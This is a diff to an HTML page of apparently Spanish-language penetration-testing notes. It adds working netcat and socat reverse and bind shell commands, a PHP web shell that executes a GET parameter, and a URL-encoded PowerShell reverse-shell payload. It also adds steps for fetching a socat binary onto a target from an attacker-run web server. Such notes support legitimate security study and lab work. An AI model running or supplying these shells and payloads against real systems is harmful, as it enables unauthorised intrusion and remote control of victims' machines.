@@ -62,26 +62,209 @@
                     <li><a class="enlace" href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells"
                             target="_blank"><span class="comando1"></span>
                             SecLists</span></a>: repositorio donde tambien contiene reverse Shells.</li>
-
-
-
                 </ol>
-            </li>
-            <li><span class="comando1">#</span>: super usuario.</li>
-            <li><span class="comando1">pwd</span>: directorio de trabajo actual.</li>
-            <li><span class="comando1">which</span>: localiza la ruta de los archivos ejecutables.</li>
-
-            <li><span class="comando1">ps</span>: muestra los procesos que se están ejecutando.
+            <li><span class="comando1"> Puertos recomendables</span>: <span class="comando4">80, 443 ó 53 </span>
                 <ol>
-                    <li><span class="comando2">Los números 3-5 digitos que aparece en la segunda columna se le conoce
-                            como process ID(PID)</span></li>
-                    <li><span class="comando2">-ef</span>: listar todos los procesos del sistema </li>
+                    <li><span class="comando5">Estos puertos el listener debe ejecutarse con sudo, con esto puede que
+                            supere las reglas del firewall.</span></li>
                 </ol>
             </li>
-            <li><span class="comando1">kill&lt;PID&gt;</span>: mata procesos.</li>
+            </li>
 
-            <span class="pasos">Netcat Shell Stabilisation</span>
-            <li><span class="comando1">Python</span>: pasos cuando python esta instalado de forma predeterminada.
+            <br>
+            <br>
+            <span class="pasos">Bind y Reverse Netcat shells</span>
+
+
+            <li><span class="comando1">Reverse shell</span>
+                <ol>
+                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>: <span
+                            class="comando4">sudo nc -lvnp
+                            &lt;PORT&gt;</span>
+                    </li>
+                    <li><span class="comando2">Crear una reverse shell en el target </span>: <span class="comando4">
+                            nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</span>
+                        <ol>
+                            <span class="comando3">Puede ser tambien un .exe para Windows</span>:
+                            <span class="comando4">"cmd.exe" </span>
+                        </ol>
+                    </li>
+                </ol>
+                <ol>
+                    <li><span class="comando5">Opcion 2</span></li>
+                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>: <span
+                            class="comando4">sudo nc -lvnp
+                            &lt;PORT&gt;</span>
+                    </li>
+                    <li><span class="comando2">Crear una reverse shell en el target </span>: <span class="comando4">
+                            mkfifo /tmp/f; nc &lt;TARGET&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&1; rm
+                            /tmp/f
+                        </span></li>
+                </ol>
+            </li>
+
+            <li><span class="comando1">Bind shell</span>
+
+                <ol>
+                    <li><span class="comando2">Crear una reverse shell en el target </span>: <span class="comando4">
+                            nc -lvnp &lt;PORT&gt; -e "cmd.exe"
+                        </span></li>
+                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>: <span
+                            class="comando4">nc &lt;LOCAL IP&gt; &lt;PORT&gt; </span>
+                        <ol>
+                            <span class="comando3">Puede ser tambien un .exe para Windows</span>:
+                            <span class="comando4">"cmd.exe" </span>
+                        </ol>
+                    </li>
+
+
+                </ol>
+
+                <ol>
+                    <li><span class="comando5">Opcion 2</span></li>
+
+                    <li><span class="comando2">Crearemos una bind shell en el target</span>: <span class="comando4">
+                            mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&1; rm /tmp/f
+                        </span> </li>
+                    <li><span class="comando2">En nuestra maquina atacante </span>: <span class="comando4">nc
+                            &lt;Target&gt; &lt;PORT&gt; </span> </li>
+                </ol>
+            </li>
+
+
+            <br>
+            <br>
+
+            <span class="pasos">Bind y Reverse Socat shells</span>
+            <li><span class="comando1">Reverse shell</span>
+                <ol>
+                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>: <span
+                            class="comando4">socat TCP-L:&lt;PORT&gt; -
+                            &lt;PORT&gt;</span>
+                    </li>
+                    <li><span class="comando2">Crear una reverse shell en el target en Linux </span><i
+                            class="fab fa-linux"></i>: <span class="comando4">
+                            socat TCP:&lt;LOCAL-IP&gt;:&lt;PORT&gt; EXEC:"bash -li"
+                        </span></li>
+
+                    <li><span class="comando2">Crear una reverse shell en el target en Windows </span><i
+                            class="fab fa-windows"></i>: <span class="comando4">
+                            socat TCP:&lt;LOCAL-IP&gt;:&lt;PORT&gt; EXEC:powershell.exe,pipes
+                        </span></li>
+                </ol>
+            </li>
+
+            <li><span class="comando1">Bind shell</span>
+
+                <ol>
+                    <li><span class="comando2">Crear una reverse shell en el target en linux </span><i
+                            class="fab fa-linux"></i>: <span class="comando4">
+                            socat TCP-L:&lt;PORT&gt; EXEC:"bash -li"
+                        </span></li>
+                    <li><span class="comando2">Crear una reverse shell en el target en windows </span><i
+                            class="fab fa-windows"></i>: <span class="comando4">
+                            socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes
+                        </span></li>
+
+                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>: <span
+                            class="comando4">
+                            socat TCP:&lt;Target&gt;:&lt;PORT&gt; -
+
+                        </span>
+                    </li>
+
+                    <li><span class="comando5">Cuando socat no viene instalado</span></li>
+
+                    <li> <span class="comando2">Por defecto Socat no viene instalado, pero podemos cargar un precompiled
+                            socat binary</span>: <span class="comando4"></span>
+                        <a class="enlace"
+                            href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true"
+                            target="_blank"><span class="comando1"></span>
+                            Socat</span></a>
+                    </li>
+                    <li><span class="comando2">Montar un web server, se tiene que montar donde esta guardado el
+                            socat</span>: <span class="comando4">sudo python3 -m http.server 80</span></li>
+                    <li><span class="comando2">Ir a windows y abrir Powershell</span>: <span
+                            class="comando4">Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile
+                            C:\\Windows\temp\socat.exe</span>
+                        <ol>
+                            <li><span class="comando4"> Invoke-WebRequest -uri http://10.13.14.123:80/socat -outfile
+                                    C:\\Windows\temp\socat.exe</span></li>
+                        </ol>
+                    </li>
+                    <li><span class="comando2">Comprobamos que se subio el archivo</span></li>
+                    <li><span class="comando2">Ahora ponemos un listener con socat</span>: <span class="comando4"> socat
+                            TCP-L:&lt;PORT&gt; -</span>
+                    <li><span class="comando2">Ahora nos vamo a windows y ejecuatamos el comando en powershell</span>:
+                        <span class="comando4">
+                            socat TCP:&lt;LOCAL-IP&gt;:&lt;PORT&gt; EXEC:powershell.exe,pipes
+                    </li>
+                </ol>
+            </li>
+
+            <br>
+            <br>
+
+            <span class="pasos">Web shell</span>
+
+            <li><span class="comando1">Reverse shell</span>
+                <ol>
+                    <li><span class="comando2">Creamos un archivo llamado php-reverse-shel.php</span>: <span
+                            class="comando4"> &lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;";
+                            ?&gt; </span>
+                    </li>
+                    <li><span class="comando2">Subimos el archivo </span></li>
+                    <li><span class="comando2">Al final de la URL le agregamos</span>: <span
+                            class="comando4">?cmd=</span></li>
+
+                    <li><span class="comando2">Probamos con los siguientes comandos, para combrobar que tenemos
+                            acceso</span>: <span class="comando4">ipconfig, whoami, hostname, arch</span></li>
+                    <li><span class="comando2">Si en caso que el php se ejecuta en un Windows Server, necesitamos correr
+                            un reverse shell en powershell </span></li>
+                    <li><span class="comando2">Modificaresmos el IP y el PORT de la URL Encoded Power </span>:
+                        <p>
+                            <span class="comando4">
+
+                                powershell%20-c%20%22%24client%20%3D%20New-
+                                Object%20System.Net.Sockets.TCPClient%28%27
+                                &lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream
+                                %20%3D%20%24client.GetStream%28%29%3B%
+                                5Bbyte%5B%5D%5D%24bytes%20%3D%200
+                                ..65535%7C%25%7B0%7D%3Bwhile%28%28
+                                %24i%20%3D%20%24stream.Read%28%24bytes
+                                %2C%200%2C%20%24bytes.Length%29%29%20-
+                                ne%200%29%7B%3B%24data%
+                                20%3D%20%28New-Object%20TypeName%
+                                20System.Text.ASCIIEncoding
+                                %29.GetString%28%24bytes%2C0%2C%20%
+                                24i%29%3B%24sendback%20%3D%20%28iex%20%24data
+                                %202%3E%261%20%7C%20Out-String%20%29%3B%
+                                24sendback2%20%3D%20%24sendback
+                                %20%2B%20%27PS%20%27%20%2B%20%28pwd
+                                %29.Path%20%2B%20%27%3E%20%27%3B%
+                                24sendbyte%20%3D%20%28
+                                %5Btext.encoding%5D%3A%3AASCII%29.GetBytes
+                                %28%24sendback2%29%3B%24stream.Write%28%
+                                24sendbyte%2C0%2C%24sendbyte.Length%29%3B
+                                %24stream.Flush%28%29%7D%3B%
+                                24client.Close%28%29%22
+                            </span>
+                        </p>
+
+                    </li>
+                    <li><span class="comando2">Ponemos un listener en escucha</span>: <span class="comando4"> cc –lvnp
+                            &lt;PORT&gt;</li>
+                </ol>
+
+            </li>
+
+
+
+            <br>
+            <br>
+
+            <li><span class="comando1">Tratamiento de tty</span>: pasos cuando python esta instalado de forma
+                predeterminada.
                 <ol>
                     <li><span class="comando2">1. Ejecutar para generar un Shell Bash</span>: <span class="comando4">
                             python -c 'import pty;pty.spawn("/bin/bash")' </span>
@@ -97,8 +280,8 @@
                             class="comando4"> export TERM=xterm </span> </li>
                     <li><span class="comando2">3. Ejecutar el shell en segundo plano usando el comando </span>: <span
                             class="comando4"> Ctrl + z </span> </li>
-                    <li><span class="comando2">4. Ejecutar para que se apague el echo de nuesta terminal</span>: <span
-                            class="comando4"> stty raw -echo; fg </span>
+                    <li><span class="comando2">4. Renovar la terminal de segundo plano</span>: <span class="comando4">
+                            stty raw -echo; fg </span>
 
                         <ol>
                             <li><span class="comando5">Tenga en cuenta que si el Shell muere, cualquier entrada en su
@@ -110,6 +293,12 @@
                     </li>
                 </ol>
             </li>
+
+
+
+
+
+
 
 
 
@@ -146,35 +335,7 @@
 
 
 
-            <li><span class="comando1">socat</span>: pasos para generar una shell mas simple, en la cual se usa para un
-                Shell netcat como trampolin hacia un Shell Socat con mas funciones
-                <ol>
-                    <li><span class="comando2">1. Montamos un servidor web en nuestra maquina</span>: <span
-                            class="comando4">
-                            python3 -m http.server 80</span>
 
-                    </li>
-                    <li><span class="comando2">2. Descargar binario compilado estatico socat</span>:
-
-                        <a class="enlace"
-                            href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true"
-                            target="_blank"><span class="comando1"></span>
-                            socat static compiled binary</span></a>
-                    </li>
-                    <li><span class="comando2">3. En la maquina target, usar netcat para descargar el archivo </span>:
-                        <span class="comando4"> wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat </span>
-                        <ol>
-                            <li><span class="comando5">Nota: se puede usar curl o wget </span> </li>
-                        </ol>
-
-                    </li>
-
-                    <li><span class="comando2"> Se puede hacer lo mismo en PowerShell</span>:
-                        <span class="comando4"> Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile
-                            C:\\Windows\temp\socat.exe </span>
-                     </li>
-                </ol>
-            </li>
 
 
 
